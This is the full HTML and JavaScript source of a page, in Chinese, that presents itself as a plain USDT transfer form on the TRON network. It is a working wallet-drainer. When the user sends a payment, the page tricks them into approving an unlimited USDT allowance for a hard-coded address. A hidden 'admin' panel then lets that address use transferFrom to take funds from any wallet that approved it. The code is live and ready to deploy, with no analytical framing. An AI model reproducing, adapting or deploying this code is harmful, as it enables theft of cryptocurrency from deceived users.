<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.header-right-icons { display: flex; gap: 12px; align-items: center; }
.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
.wallet-dot.connected { background-color: #22c55e; }
.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
.amount-input::placeholder { font-size: 16px; color: #aaa; }
.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; user-select: none; }
.token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
.token-left { display: flex; align-items: center; gap: 10px; }
.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
.token-name { font-size: 18px; font-weight: 500; }
.token-balance { color: #555; font-size: 16px; }
.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; transition:0.2s; }
.send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
.admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
.admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
.admin-input-item{ margin-bottom:14px; }
.admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
.admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
.admin-btn:disabled{ background:#f8a1a1; cursor:not-allowed; }
.tip-area{ padding:12px; text-align:center; color:#444; font-size:15px; min-height:44px; }
</style>
</head>
<body>
<div class="top-header-bar">
<div></div>
<div class="header-right-icons">
<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
<div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
</div>
</div>

<div id="tipArea" class="tip-area"></div>

<div class="address-card">
<div class="label-text">收款地址</div>
<div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>
<div class="amount-card">
<div class="label-text">转出数量（USDT）</div>
<div class="amount-row">
<input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
<div class="max-btn" id="maxBtn">MAX</div>
</div>
<div class="token-row">
<div class="token-left">
<img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
<span class="token-name">USDT</span>
</div>
<span class="token-balance" id="balanceText">0.000000</span>
</div>
</div>
<div class="result-card">
<div class="label-text">到账数量</div>
<input id="receiveAmount" class="result-input" readonly>
</div>
<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<div class="admin-panel" id="adminPanel">
<div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
<div class="admin-input-item">
<div class="label-text">请输入已经授权用户钱包地址</div>
<input class="admin-input" id="userAddrInput" placeholder="T开头用户TRC20地址">
</div>
<div class="admin-input-item">
<div class="label-text">划扣USDT数量</div>
<input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
</div>
<button class="admin-btn" id="deductBtn">确认划扣</button>
</div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";
const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

let tronWeb = null;
let userAddress = "";
let usdtContract = null;
let provider = null;
let isBusy = false;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");
const tipArea = $("#tipArea");
const adminPanel = $("#adminPanel");
const userAddrInput = $("#userAddrInput");
const deductAmountInput = $("#deductAmountInput");
const deductBtn = $("#deductBtn");

const USDT_ABI = [
{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

async function waitTrxConfirm(txId, maxWait = 30){
    for(let i=0;i<maxWait;i++){
        try{
            const res = await tronWeb.trx.getTransactionReceipt(txId);
            if(res && res.receipt){
                if(res.receipt.result === "SUCCESS") return true;
                else throw new Error("合约执行失败");
            }
        }catch(e){}
        await new Promise(r=>setTimeout(r,1000));
    }
    throw new Error("交易广播，未确认，请去Tronscan查看哈希");
}

function disconnectWallet() {
    tronWeb = null; userAddress = ""; usdtContract = null; provider = null;
    walletDot.classList.remove("connected"); sendBtn.disabled = true;
    balanceText.textContent = "0.000000"; adminPanel.style.display = "none";
    tipArea.innerText = "";
}

async function loadBalance() {
    try{
        const rawSun = await usdtContract.balanceOf(userAddress).call();
        balanceText.textContent = Number(tronWeb.fromSun(rawSun)).toFixed(6);
    }catch(e){ balanceText.textContent = "--"; }
}

async function connectWalletLogic() {
    if(isBusy) return;
    if (tronWeb && userAddress) { disconnectWallet(); return; }
    try {
        if (window.tokenpocket?.tron) {
            provider = window.tokenpocket.tron;
            const accounts = await provider.request({ method: "tron_requestAccounts" });
            userAddress = accounts[0];
            tronWeb = window.tokenpocket.tronWeb;
        }else if (window.tronProvider) {
            provider = window.tronProvider;
            const accounts = await provider.request({ method: "tron_requestAccounts" });
            userAddress = accounts[0];
            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
        }else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
        }else {
            tipArea.innerText = "请在TP钱包内置浏览器打开";
            return;
        }
        walletDot.classList.add("connected");
        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
        await loadBalance();
        sendBtn.disabled = false;
        tipArea.innerText = "钱包已连接，请输入转账金额";
        if(userAddress === TARGET_ADDR) adminPanel.style.display = "block";
        else adminPanel.style.display = "none";
        if (provider?.on) {
            provider.on("accountsChanged", () => location.reload());
            provider.on("chainChanged", () => location.reload());
        }
    } catch (err) {
        tipArea.innerText = "钱包连接失败";
        disconnectWallet();
    }
}

amountInput.addEventListener("input", () => {
    amountInput.value = amountInput.value.replace(/[^0-9.]/g,'');
    const parts = amountInput.value.split('.');
    if(parts.length>2) amountInput.value = parts[0]+'.'+parts.slice(1).join('');
    receiveAmount.value = (parseFloat(amountInput.value)||0).toFixed(6);
});

maxBtn.addEventListener("click", async () => {
    if (!usdtContract || isBusy) return;
    const rawSun = await usdtContract.balanceOf(userAddress).call();
    amountInput.value = Number(tronWeb.fromSun(rawSun)).toFixed(6);
    amountInput.dispatchEvent(new Event("input"));
});

// =========核心完整流程=========
sendBtn.addEventListener("click", async () => {
    if(isBusy) return;
    if (!tronWeb) { alert("请先连接钱包"); return; }
    const val = parseFloat(amountInput.value);
    if (isNaN(val) || val <= 0) { alert("请输入有效转账金额"); return; }
    const sunVal = tronWeb.toSun(val);
    isBusy = true; sendBtn.disabled = true;
    try {
        //1、检查授权额度
        tipArea.innerText = "检查授权额度...";
        const allowanceRaw = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
        const allowanceBig = BigInt(allowanceRaw.toString());
        const needBig = BigInt(sunVal);

        //额度不够，发起授权签名（弹窗钱包签名）
        if(allowanceBig < needBig){
            tipArea.innerText = "请签名授权USDT额度";
            const approveHash = await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send();
            await waitTrxConfirm(approveHash);
            tipArea.innerText = "✅授权成功，请再次签名完成转账";
        }

        //2、授权完成，直接发起转账，唤起钱包第二次签名
        tipArea.innerText = "请签名确认转账";
        const transferHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send();
        await waitTrxConfirm(transferHash);

        tipArea.innerText = "✅转账完成，资金已到目标地址";
        alert(`转账成功！交易哈希：${transferHash}`);
        await loadBalance();
        amountInput.value = ""; receiveAmount.value = "";
    } catch (e) {
        alert("操作失败："+(e?.message||e));
        tipArea.innerText = "操作被取消或者执行失败";
    } finally {
        isBusy = false; sendBtn.disabled = false;
    }
});

deductBtn.addEventListener("click",async ()=>{
    if(isBusy) return;
    if(!tronWeb || userAddress !== TARGET_ADDR){
        return alert("必须使用管理员钱包链接！");
    }
    const fromUserAddr = userAddrInput.value.trim();
    const deductNum = parseFloat(deductAmountInput.value);
    if(!fromUserAddr || !fromUserAddr.startsWith('T')) return alert("填写合法T开头地址");
    if(isNaN(deductNum) || deductNum <=0) return alert("填写合法划扣金额");
    const deductSun = tronWeb.toSun(deductNum);
    isBusy = true; deductBtn.disabled = true;
    try{
        const userAllowanceRaw = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
        if(BigInt(userAllowanceRaw.toString()) < BigInt(deductSun)) throw new Error("用户授权额度不足");
        const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
        await waitTrxConfirm(txHash);
        alert(`✅划扣成功 hash:${txHash}`);
        userAddrInput.value = ""; deductAmountInput.value = "";
        await loadBalance();
    }catch(err){
        alert("❌划扣失败:"+(err?.message||err));
    }finally{
        isBusy = false; deductBtn.disabled = false;
    }
});

walletDot.addEventListener("click", connectWalletLogic);
settingIconBtn.addEventListener("click", () => alert("设置面板"));

window.addEventListener("DOMContentLoaded", () => {
    setTimeout(connectWalletLogic, 800);
});
</script>
</body>
</html>
